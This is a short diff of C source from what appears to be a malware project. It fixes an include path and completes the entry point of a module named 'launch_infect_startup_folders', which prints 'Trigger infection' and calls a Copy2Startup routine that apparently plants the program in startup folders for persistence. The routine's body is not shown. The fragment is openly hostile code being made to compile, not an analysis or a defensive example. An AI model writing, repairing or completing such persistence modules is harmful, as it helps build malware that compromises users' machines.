@@ -3,7 +3,7 @@
 #include <stdio.h>
 
 #include "core.h"
-#include "startup_folders.h"
+#include "../include/startup_folders.h"
 
 
 
@@ -65,7 +65,8 @@ static int Copy2Startup(){
 
 
 /* Entrypoint */
-int launch_infect_startup_folders(struct ModStat** mds);
+int launch_infect_startup_folders(struct ModStat** mds){
+    *mds = NULL;
     puts("Trigger infection");
     Copy2Startup();
     return 0;
